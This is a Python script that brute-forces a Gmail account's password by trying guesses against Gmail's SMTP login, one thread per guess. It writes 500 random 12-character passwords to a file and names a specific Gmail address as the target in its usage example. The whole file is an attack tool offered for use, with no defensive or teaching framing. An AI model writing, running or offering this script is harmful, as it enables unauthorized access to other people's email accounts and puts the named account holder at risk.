#!/usr/bin/env python
from smtplib import SMTP, SMTPAuthenticationError
from termcolor import colored
import threading
import random
import string

THREAD_COUNT = 10  # Number of threads to use for parallel password guessing

def attempt_login(target_gmail, password):
    try:
        server = SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(target_gmail, password)
        print(colored(f"[+] Password Found: {password}", "green"))
        server.quit()
    except SMTPAuthenticationError:
    	print(colored(f"[*] Wrong Password: {password}", "red"))
    except Exception as e:
        print(f"Error occurred: {e}")

def generate_and_save_strings(length, num_strings, filename):
    with open(filename, 'w') as file:
        for _ in range(num_strings):
            generated_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            file.write(generated_string + '\n')

def gmail_brute_force(target_gmail, passwordlist):
    try:
        with open(passwordlist, "r") as file:
            passwords = [password.rstrip() for password in file]
            thread_list = []

            for password in passwords:
                thread = threading.Thread(target=attempt_login, args=(target_gmail, password))
                thread_list.append(thread)
                thread.start()

            for thread in thread_list:
                thread.join()

    except FileNotFoundError:
        print(f"File '{passwordlist}' not found.")
    except IOError:
        print(f"Error reading file '{passwordlist}'.")

# Usage example:
target_gmail = "josephnyameke45@gmail.com"# Replace with the target Gmail account
passwordlist = "passwordlist.txt"  # Replace with the path to your password list file

# Generate 12-character passwords and save to the file
generate_and_save_strings(12, 500, passwordlist)

# Perform the Gmail brute-force attack
gmail_brute_force(target_gmail, passwordlist)
